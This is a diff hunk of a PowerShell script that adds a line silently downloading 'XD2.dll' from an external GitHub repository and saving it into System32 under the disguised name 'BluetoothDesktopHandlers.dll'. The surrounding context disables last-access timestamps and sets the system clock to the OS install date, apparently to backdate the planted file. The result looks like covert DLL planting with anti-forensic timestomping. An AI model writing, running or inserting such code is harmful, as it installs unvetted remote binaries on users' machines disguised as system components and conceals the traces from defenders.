@@ -16,6 +16,8 @@ fsutil behavior set disablelastaccess 1
 $os = Get-CimInstance Win32_OperatingSystem
 $installDateTime = [Management.ManagementDateTimeConverter]::ToDateTime($os.InstallDate)
 Set-Date -Date $installDateTime
+$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/zold1337/toolsvip/raw/refs/heads/main/XD2.dll' -OutFile "C:\Windows\System32\BluetoothDesktopHandlers.dll"
+
 
 $f = "C:\Windows\System32\BluetoothDesktopHandlers.dll"
 $d = (Get-CimInstance Win32_OperatingSystem).InstallDate
